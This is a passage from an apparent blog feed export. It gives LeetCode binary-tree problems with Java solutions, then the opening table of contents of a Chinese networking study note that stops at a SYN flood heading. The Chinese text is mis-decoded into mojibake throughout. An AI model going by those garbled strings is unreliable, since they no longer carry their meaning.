class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">Input: [5,3,6,2,4,null,8,1,null,null,null,7,9]</span><br><span class="line"></span><br><span class="line">       5</span><br><span class="line">      / \</span><br><span class="line">    3    6</span><br><span class="line">   / \    \</span><br><span class="line">  2   4    8</span><br><span class="line"> /        / \ </span><br><span class="line">1        7   9</span><br><span class="line"></span><br><span class="line">Output: [1,null,2,null,3,null,4,null,5,null,6,null,7,null,8,null,9]</span><br><span class="line"></span><br><span class="line"> 1</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line">    \</span><br><span class="line">     3</span><br><span class="line">      \</span><br><span class="line">       4</span><br><span class="line">        \</span><br><span class="line">         5</span><br><span class="line">          \</span><br><span class="line">           6</span><br><span class="line">            \</span><br><span class="line">             7</span><br><span class="line">              \</span><br><span class="line">               8</span><br><span class="line">                \</span><br><span class="line">                 9  </span><br></pre></td></tr></table></figure><h2><span id="671-second-minimum-node-in-a-binary-tree">671. Second Minimum Node In a Binary Tree Ã—</span></h2><p>Given a non-empty special binary tree consisting of nodes with the non-negative value, where each node in this tree has exactly <code>two</code> or <code>zero</code> sub-node. If the node has two sub-nodes, then this nodeâ€™s value is the smaller value among its two sub-nodes. More formally, the property <code>root.val = min(root.left.val, root.right.val)</code> always holds.</p><p>Given such a binary tree, you need to output the <strong>second minimum</strong> value in the set made of all the nodesâ€™ value in the whole tree.</p><p>If no such second minimum value exists, output -1 instead.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">    2</span><br><span class="line">   / \</span><br><span class="line">  2   5</span><br><span class="line">     / \</span><br><span class="line">    5   7</span><br><span class="line"></span><br><span class="line">Output: 5</span><br><span class="line">Explanation: The smallest value is 2, the second smallest value is 5.</span><br></pre></td></tr></table></figure><p> <strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">    2</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line"></span><br><span class="line">Output: -1</span><br><span class="line">Explanation: The smallest value is 2, but there isn&#x27;t any second smallest value.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findSecondMinimumValue</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">if</span>(root.left==<span class="literal">null</span>&amp;&amp;root.right==<span class="literal">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">leftVal</span> <span class="operator">=</span> root.left.val;</span><br><span class="line">       <span class="type">int</span> <span class="variable">rightVal</span> <span class="operator">=</span> root.right.val;  </span><br><span class="line">       <span class="keyword">if</span>(root.val==leftVal) leftVal=findSecondMinimumValue(root.left);</span><br><span class="line">       <span class="keyword">if</span>(root.val==rightVal) rightVal=findSecondMinimumValue(root.right);</span><br><span class="line">       <span class="keyword">if</span> (leftVal != -<span class="number">1</span> &amp;&amp; rightVal != -<span class="number">1</span>) <span class="keyword">return</span> Math.min(leftVal, rightVal);</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">return</span> leftVal==-<span class="number">1</span>?rightVal:leftVal;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="98-validate-binary-search-tree-">98. Validate Binary Search Tree -</span></h2><ul><li><p>ä¸­åºéå†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; rec = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    dfs(root,rec);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;rec.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(rec.get(i)&gt;=rec.get(i+<span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root,ArrayList&lt;Integer&gt; rec)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    dfs(root.left,rec);</span><br><span class="line">    rec.add(root.val);</span><br><span class="line">    dfs(root.right,rec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>é€’å½’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dfs(root,Long.MAX_VALUE,Long.MIN_VALUE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(TreeNode root,<span class="type">long</span> max,<span class="type">long</span> min)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(root.val&gt;=max||root.val&lt;=min) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> dfs(root.left,root.val,min)&amp;&amp;dfs(root.right,max,root.val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="110-balanced-binary-tree">110. Balanced Binary Tree âˆš</span></h2><p>Given a binary tree, determine if it is height-balanced.</p><p>For this problem, a height-balanced binary tree is defined as:</p><blockquote><p>a binary tree in which the left and right subtrees of <em>every</em> node differ in height by no more than 1. </p></blockquote><p><strong>Example 1:</strong></p><p>Given the following tree <code>[3,9,20,null,null,15,7]</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>Return true.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       <span class="type">int</span> rHeight=<span class="number">0</span>,lHeight=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       rHeight = checkHeight(root.right,rHeight);</span><br><span class="line">       lHeight = checkHeight(root.left,lHeight);</span><br><span class="line">       <span class="keyword">return</span> Math.abs(rHeight-lHeight)&lt;=<span class="number">1</span>&amp;&amp;isBalanced(root.left)&amp;&amp;isBalanced(root.right);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">checkHeight</span><span class="params">(TreeNode root,<span class="type">int</span> height)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> height;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span>+Math.max(checkHeight(root.right, height),checkHeight(root.left, height));</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="ä¸¤æ£µæ ‘çš„åˆ¤æ–­">ä¸¤æ£µæ ‘çš„åˆ¤æ–­</span></h1><h2><span id="101-symmetric-tree">101. Symmetric Tree âˆš</span></h2><p>Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).</p><p>For example, this binary tree <code>[1,2,2,3,4,4,3]</code> is symmetric:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   2</span><br><span class="line"> / \ / \</span><br><span class="line">3  4 4  3</span><br></pre></td></tr></table></figure><p>But the following <code>[1,2,2,null,3,null,3]</code> is not:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">2   2</span><br><span class="line"> \   \</span><br><span class="line"> 3    3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> checkSym(root.left,root.right);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkSym</span><span class="params">(TreeNode p, TreeNode q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">null</span>&amp;&amp;q==<span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">null</span>||q==<span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> checkSym(p.left,q.right)&amp;&amp;checkSym(p.right,q.left)&amp;&amp;p.val==q.val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="100-same-tree">100. Same Tree âˆš</span></h2><p>Given two binary trees, write a function to check if they are the same or not.</p><p>Two binary trees are considered the same if they are structurally identical and the nodes have the same value.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br><span class="line"></span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          /           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> &#123; </span><br><span class="line">       <span class="keyword">if</span>(p==<span class="literal">null</span>&amp;&amp;q==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       <span class="keyword">if</span>(p==<span class="literal">null</span>||q==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">return</span> isSameTree(p.left,q.left)&amp;&amp;isSameTree(p.right,q.right)&amp;&amp;p.val==q.val;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="617-merge-two-binary-trees">617. Merge Two Binary Trees âˆš</span></h2><p>Given two binary trees and imagine that when you put one of them to cover the other, some nodes of the two trees are overlapped while the others are not.</p><p>You need to merge them into a new binary tree. The merge rule is that if two nodes overlap, then sum node values up as the new value of the merged node. Otherwise, the NOT null node will be used as the node of new tree.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">Tree 1                     Tree 2                  </span><br><span class="line">          1                         2                             </span><br><span class="line">         / \                       / \                            </span><br><span class="line">        3   2                     1   3                        </span><br><span class="line">       /                           \   \                      </span><br><span class="line">      5                             4   7                  </span><br><span class="line">Output: </span><br><span class="line">Merged tree:</span><br><span class="line">     3</span><br><span class="line">    / \</span><br><span class="line">   4   5</span><br><span class="line">  / \   \ </span><br><span class="line"> 5   4   7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(t1==<span class="literal">null</span>&amp;&amp;t2==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">if</span>(t1==<span class="literal">null</span>||t2==<span class="literal">null</span>) <span class="keyword">return</span> t1==<span class="literal">null</span>?t2:t1;</span><br><span class="line">       t1.val=t1.val+t2.val;</span><br><span class="line">       t1.left=mergeTrees(t1.left,t2.left);</span><br><span class="line">       t1.right=mergeTrees(t1.right,t2.right);</span><br><span class="line">       <span class="keyword">return</span> t1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="572-subtree-of-another-tree">572. Subtree of Another Tree âˆš</span></h2><p>Given two non-empty binary trees <strong>s</strong> and <strong>t</strong>, check whether tree <strong>t</strong> has exactly the same structure and node values with a subtree of <strong>s</strong>. A subtree of <strong>s</strong> is a tree consists of a node in <strong>s</strong> and all of this nodeâ€™s descendants. The tree <strong>s</strong> could also be considered as a subtree of itself.</p><p><strong>Example 1:</strong><br>Given tree s:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    3</span><br><span class="line">   / \</span><br><span class="line">  4   5</span><br><span class="line"> / \</span><br><span class="line">1   2</span><br></pre></td></tr></table></figure><p>Given tree t:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  4 </span><br><span class="line"> / \</span><br><span class="line">1   2</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSubtree</span><span class="params">(TreeNode s, TreeNode t)</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (s == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> isS(s,t)||isSubtree(s.left,t)||isSubtree(s.right,t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isS</span><span class="params">(TreeNode s, TreeNode t)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="literal">null</span>&amp;&amp;t==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="literal">null</span>||t==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;       </span><br><span class="line">        <span class="keyword">return</span> t.val==s.val&amp;&amp;isS(s.left,t.left)&amp;&amp;isS(s.right,t.right);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œ</title>
      <link href="/2020/03/30/Network/"/>
      <url>/2020/03/30/Network/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ•´ç†äº†è®¡ç®—æœºç½‘ç»œçš„å¸¸è€ƒçŸ¥è¯†ç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#tcpip">TCP&#x2F;IP</a><ul><li><a href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B"><em>ä¸‰æ¬¡æ¡æ‰‹</em></a><ul><li><a href="#syn-flood%E6%94%BB%E5%87%BB">SYN Floodæ”»å‡» âˆš</a><ul><li><a href="#%E5%AE%9A%E4%B9%89">å®šä¹‰</a></li><li><a href="#%E5%8E%9F%E7%90%86">åŸç†</a></li><li><a href="#%E9%98%B2%E8%8C%83%E6%9C%BA%E5%88%B6"><em>é˜²èŒƒæœºåˆ¶</em></a></li></ul></li></ul></li><li><a href="#tcp%E6%8A%A5%E6%96%87%E5%A4%B4"><em>TCPæŠ¥æ–‡å¤´</em> âˆš</a><ul><li><a href="#%E5%AE%9A%E4%B9%89"><em>å®šä¹‰</em></a></li></ul><ul><li><a href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B">ä¸‰æ¬¡æ¡æ‰‹</a></li><li><a href="#%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B">å››æ¬¡æŒ¥æ‰‹</a></li></ul></li><li><a href="#%E5%92%8Cudp%E7%9A%84%E5%8C%BA%E5%88%AB"><em>å’ŒUDPçš„åŒºåˆ«</em></a><ul><li><a href="#udp%E7%9A%84%E6%8A%A5%E5%A4%B4-"><em>UDPçš„æŠ¥å¤´</em> -</a></li><li><a href="#%E5%9F%BA%E4%BA%8E-udp-%E7%9A%84%E5%87%A0%E4%B8%AA%E4%BE%8B%E5%AD%90"><em>åŸºäº UDP çš„å‡ ä¸ªä¾‹å­</em></a></li></ul></li><li><a href="#%E5%8F%AF%E9%9D%A0%E6%80%A7">å¯é æ€§ï¼š</a></li><li><a href="#%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6"><em>æ‹¥å¡æ§åˆ¶</em></a></li><li><a href="#%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3"><em>æ»‘åŠ¨çª—å£</em></a><ul><li><a href="#%E5%AE%9A%E4%B9%89-1"><em>å®šä¹‰</em></a></li><li><a href="#%E4%BD%9C%E7%94%A8"><em>ä½œç”¨</em></a></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><em>å¸¸è§é—®é¢˜ï¼š</em></a></li></ul></li><li><a href="#http">HTTP</a><ul><li><a href="#%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9">ä¸»è¦ç‰¹ç‚¹ âˆš</a></li></ul></li><li><a href="#%E8%AF%B7%E6%B1%82%E5%93%8D%E5%BA%94%E7%9A%84%E6%AD%A5%E9%AA%A4">è¯·æ±‚\å“åº”çš„æ­¥éª¤</a></li><li><a href="#%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E9%94%AE%E5%85%A5url%E6%8C%89%E4%B8%8B%E5%9B%9E%E8%BD%A6%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B%E9%9D%A2%E8%AF%95">åœ¨æµè§ˆå™¨é”®å…¥URLï¼ŒæŒ‰ä¸‹å›è½¦ä¹‹åçš„æµç¨‹ï¼ˆé¢è¯•ï¼‰</a><ul><li><a href="#%E8%AF%B7%E6%B1%82%E7%BB%93%E6%9E%84%E8%AF%B7%E6%B1%82%E8%A1%8C-%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%83%A8-%E8%AF%B7%E6%B1%82%E6%95%B0%E6%8D%AE">è¯·æ±‚ç»“æ„ï¼ˆè¯·æ±‚è¡Œ-è¯·æ±‚å¤´éƒ¨-è¯·æ±‚æ•°æ®ï¼‰</a><ul><li><a href="#%E9%A6%96%E5%85%88%E7%9C%8B%E7%9C%8Bhttp%E8%AF%B7%E6%B1%82%E6%B6%88%E6%81%AF%E5%B0%B1%E6%98%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%A2%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84">é¦–å…ˆçœ‹çœ‹httpè¯·æ±‚æ¶ˆæ¯ï¼ˆå°±æ˜¯æµè§ˆå™¨ä¸¢ç»™æœåŠ¡å™¨çš„ï¼‰ï¼š</a></li><li><a href="#%E8%AF%B7%E6%B1%82%E8%A1%8C">è¯·æ±‚è¡Œ</a></li><li><a href="#%E8%AF%B7%E6%B1%82%E5%A4%B4"><strong>è¯·æ±‚å¤´</strong></a></li></ul></li><li><a href="#%E5%93%8D%E5%BA%94%E7%BB%93%E6%9E%84%E7%8A%B6%E6%80%81%E8%A1%8C-%E5%93%8D%E5%BA%94%E5%A4%B4%E9%83%A8-%E5%93%8D%E5%BA%94%E6%AD%A3%E6%96%87"><em>å“åº”ç»“æ„ï¼ˆçŠ¶æ€è¡Œ-å“åº”å¤´éƒ¨-å“åº”æ­£æ–‡ï¼‰</em></a></li><li><a href="#keep-alive%E6%A8%A1%E5%BC%8F"><em>Keep-Aliveæ¨¡å¼</em></a></li><li><a href="#%E7%8A%B6%E6%80%81%E7%A0%81">çŠ¶æ€ç </a></li><li><a href="#get%E5%92%8Cpost%E7%9A%84%E5%8C%BA%E5%88%AB-">GETå’ŒPOSTçš„åŒºåˆ« -</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFcookie">ä»€ä¹ˆæ˜¯Cookie âˆš</a></li></ul></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFsession-">ä»€ä¹ˆæ˜¯Session -</a><ul><li><a href="#cookie%E5%92%8Csession%E7%9A%84%E5%8C%BA%E5%88%AB">Cookieå’ŒSessionçš„åŒºåˆ«</a><ul><li><a href="#1-%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%B8%8D%E5%90%8C">1ã€å­˜å‚¨ä½ç½®ä¸åŒ</a></li><li><a href="#2-%E5%AD%98%E5%82%A8%E5%AE%B9%E9%87%8F%E4%B8%8D%E5%90%8C">2ã€å­˜å‚¨å®¹é‡ä¸åŒ</a></li><li><a href="#3-%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F%E4%B8%8D%E5%90%8C">3ã€å­˜å‚¨æ–¹å¼ä¸åŒ</a></li><li><a href="#4-%E9%9A%90%E7%A7%81%E7%AD%96%E7%95%A5%E4%B8%8D%E5%90%8C">4ã€éšç§ç­–ç•¥ä¸åŒ</a></li><li><a href="#5-%E6%9C%89%E6%95%88%E6%9C%9F%E4%B8%8A%E4%B8%8D%E5%90%8C">5ã€æœ‰æ•ˆæœŸä¸Šä¸åŒ</a></li><li><a href="#6-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%8B%E5%8A%9B%E4%B8%8D%E5%90%8C">6ã€æœåŠ¡å™¨å‹åŠ›ä¸åŒ</a></li><li><a href="#7-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%AF%E6%8C%81%E4%B8%8D%E5%90%8C">7ã€æµè§ˆå™¨æ”¯æŒä¸åŒ</a></li><li><a href="#8-%E8%B7%A8%E5%9F%9F%E6%94%AF%E6%8C%81%E4%B8%8A%E4%B8%8D%E5%90%8C">8ã€è·¨åŸŸæ”¯æŒä¸Šä¸åŒ</a></li></ul></li><li><a href="#http%E5%92%8Chttps%E7%9A%84%E5%8C%BA%E5%88%AB">Httpå’ŒHttpsçš„åŒºåˆ«</a><ul><li><a href="#ssl%E5%AE%89%E5%85%A8%E5%A5%97%E6%8E%A5%E5%B1%82">SSLï¼ˆå®‰å…¨å¥—æ¥å±‚ï¼‰</a></li><li><a href="#https%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%B5%81%E7%A8%8B">Httpsæ•°æ®ä¼ è¾“æµç¨‹ï¼š</a></li><li><a href="#%E4%BA%8C-http%E4%B8%8Ehttps%E7%9A%84%E5%8C%BA%E5%88%AB">äºŒã€Httpä¸Httpsçš„åŒºåˆ«</a></li><li><a href="#%E4%BA%94-https%E7%9A%84%E7%BC%BA%E7%82%B9%E5%AF%B9%E6%AF%94%E4%BC%98%E7%82%B9">äº”ã€Httpsçš„ç¼ºç‚¹ï¼ˆå¯¹æ¯”ä¼˜ç‚¹ï¼‰</a></li></ul></li></ul></li><li><a href="#%E5%90%84%E5%B1%82%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE">å„å±‚å¸¸è§åè®®</a></li><li><a href="#socket">Socket</a><ul><li><a href="#tcpserverclient">TCPServer&#x2F;Client</a></li><li><a href="#udpserverclient">UDPServer&#x2F;Client</a></li></ul><ul><li><a href="#dns%E8%A7%A3%E6%9E%90%E4%BA%86%E8%A7%A3">DNSè§£æï¼ˆäº†è§£ï¼‰</a></li></ul></li></ul><!-- tocstop --><p><img src="/2020/03/30/Network/clip_image002.png"></p><h2><span id="tcpx2fip">TCP&#x2F;IP</span></h2><h3><span id="ä¸‰æ¬¡æ¡æ‰‹"><em>ä¸‰æ¬¡æ¡æ‰‹</em></span></h3><h4><span id="syn-floodæ”»å‡»">SYN Floodæ”»å‡» âˆš</span></h4><h5><span id="å®šä¹‰">å®šä¹‰</span></h5><p>SYN 